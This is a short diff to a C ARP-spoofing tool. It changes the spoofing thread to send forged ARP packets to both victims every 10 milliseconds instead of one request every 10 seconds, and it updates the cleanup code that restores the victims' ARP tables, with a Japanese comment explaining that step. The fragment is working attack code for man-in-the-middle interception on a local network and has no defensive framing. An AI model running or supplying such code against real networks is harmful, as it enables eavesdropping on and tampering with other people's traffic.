@@ -190,8 +190,9 @@ struct argArp{
 void *arpspoof(void *p){
     struct argArp  *arg = (struct argArp *)p;
     while(1){
-        SendArpRequestB(arg->soc, arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
-        usleep(10*1000000);
+        SendArpPacket(1, arg->soc, arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
+        SendArpPacket(0, arg->soc, arg->ip_s, arg->mac_s, arg->ip_d, arg->mac_d);
+        usleep(0.01*1000000);
     }
 
     return (NULL);
@@ -358,8 +359,8 @@ int main(int argc,char *argv[],char *envp[])
 
     //victimたちのARPテーブルの修復(ARPスプーフィングのときと違い、送信元MACaddrが正しい)
     for(int k=0; k<10; k++){
-    SendArpRequestB(arg_arpspoof.soc, arg_arpspoof.ip_d, arg_arpspoof.mac_d, arg_arpspoof.ip_s, arg_arpspoof_r.mac_d);
-    SendArpRequestB(arg_arpspoof_r.soc, arg_arpspoof_r.ip_d, arg_arpspoof_r.mac_d, arg_arpspoof_r.ip_s, arg_arpspoof.mac_d);
+    SendArpPacket(1, arg_arpspoof.soc, arg_arpspoof.ip_d, arg_arpspoof.mac_d, arg_arpspoof.ip_s, arg_arpspoof_r.mac_d);
+    SendArpPacket(1, arg_arpspoof_r.soc, arg_arpspoof_r.ip_d, arg_arpspoof_r.mac_d, arg_arpspoof_r.ip_s, arg_arpspoof.mac_d);
     }
     close(Device[0].soc);
 
